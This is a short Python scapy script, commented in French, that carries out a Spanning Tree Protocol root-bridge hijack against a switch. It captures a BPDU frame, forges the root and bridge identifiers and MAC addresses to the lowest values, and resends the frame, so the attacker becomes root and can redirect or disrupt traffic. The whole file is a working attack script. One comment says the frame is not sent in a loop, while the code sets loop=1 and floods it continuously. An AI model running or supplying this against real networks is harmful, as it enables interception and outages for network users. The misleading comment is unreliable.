#!/usr/bin/python3
#Importation de toutes les fonctionnalités de la bibliothèque scapy
from scapy.all import *

def stp(interface):
    '''Cette fonction nous permet de lancer une attaque pour devenir port root sur un switch proposant du STP 802.1D
    interface -> str'''
    # Utilisation de la fonction "sniff" pour capturer une trame STP avec une adresse de destination de multidiffusion (01:80:c2:00:00:00)
    trame = sniff(filter="ether dst 01:80:c2:00:00:00", count=1, iface=interface)
    trame.show()
    # Changement de l'adresse MAC source de la trame en "00:00:00:00:00:01"
    trame[0].src = "00:00:00:00:00:01"
    # Modification de l'identifiant du switch racine (rootid) à 0 afin de mettre en place une nouvelle élection
    trame[0].rootid = 0
    # Modification de l'adresse MAC du switch racine (rootmac) à "00:00:00:00:00:01"
    trame[0].rootmac = "00:00:00:00:00:01"
    # Modification de l'identifiant du pont (bridgeid) à 0
    trame[0].bridgeid = 0
    # Modification de l'adresse MAC du pont (bridgemac) à "00:00:00:00:00:01"
    trame[0].bridgemac = "00:00:00:00:00:01"
    # Utilisation de la fonction "show" afin d'afficher les détails de la trame modifiée
    trame[0].show()
    # Utilisation de la fonction "sendp" afin d'envoyer la trame
    # La commande "loop=0" indique de ne pas envoyer la trame en boucle
    # La commande "verbose=1" indique d'afficher des informations détaillées lors l'envoi.
    sendp(trame[0], loop=1, verbose=1, iface=interface)